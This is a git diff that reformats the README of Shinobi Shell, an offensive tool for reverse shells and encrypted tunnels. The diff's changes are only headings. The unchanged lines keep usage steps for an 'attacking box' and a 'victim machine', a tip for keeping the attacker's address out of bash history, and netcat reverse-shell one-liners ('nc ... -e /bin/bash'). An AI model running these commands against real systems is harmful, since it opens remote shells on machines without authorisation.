@@ -17,7 +17,7 @@ optional arguments:
                         Local IP Address used for universal reverse shell
                         handler (optional - use if different than default)
 ```
-Use:
+## Start your server first:
 
 Server (Attacking box) 
 `./shinobishell.py -l 4443 -k`
@@ -27,7 +27,7 @@ Server (Attacking box)
 `-k` Requesting an encrypted tunnel server
 
 
-OPTION 1: Run Shinobi Shell manually on the victim machine 
+## OPTION 1: Run Shinobi Shell manually on the victim machine
 
 Client (Penetrated box) 
 `./shinobishell.py -c -k ` 
@@ -42,7 +42,7 @@ For `-c` you will be prompted at run time for the server address
 
 Both `-c` and `-k` were moved to runtime inputs to prevent leaking attacking machine address and key in bash history
 
-OPTION 2: Start a Shinobi Shell listener on your attacking machine and send it a shell
+## OPTION 2: Start a Shinobi Shell listener on your attacking machine and send it a shell
 
 Attacking Machine
 
@@ -65,6 +65,9 @@ Send a reverse shell
 `nc 127.0.0.1 1000 -e /bin/bash`
 
 `nc 127.0.0.1 1000 -e /bin/sh`
+
+
+## -h --help Help output
 
 ```
 Shinobi Shell v1.0
